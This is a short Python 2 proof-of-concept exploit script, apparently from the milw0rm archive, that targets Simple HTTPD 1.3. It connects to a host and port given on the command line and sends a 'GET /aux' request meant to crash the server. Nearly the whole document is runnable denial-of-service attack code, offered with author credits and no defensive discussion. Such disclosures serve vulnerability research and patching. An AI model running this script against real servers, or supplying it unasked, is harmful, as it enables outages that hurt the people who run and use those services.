#usage: poc.py host port

import socket
import sys

print "-----------------------------------------------------------------------"
print "Simple HTTPD 1.3 /aux Denial of Service\n"
print "url: http://shttpd.sourceforge.net\n"
print "author: shinnai"
print "mail: shinnai[at]autistici[dot]org"
print "site: http://shinnai.altervista.org"
print "-----------------------------------------------------------------------"

host = sys.argv[1]
port = long(sys.argv[2])

try:
   request =  "GET /aux HTTP/1.1\n\n"
   connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connection.connect((host, port))
   connection.send(request)
except:
   print "Unable to connect. exiting."

# milw0rm.com [2007-12-11]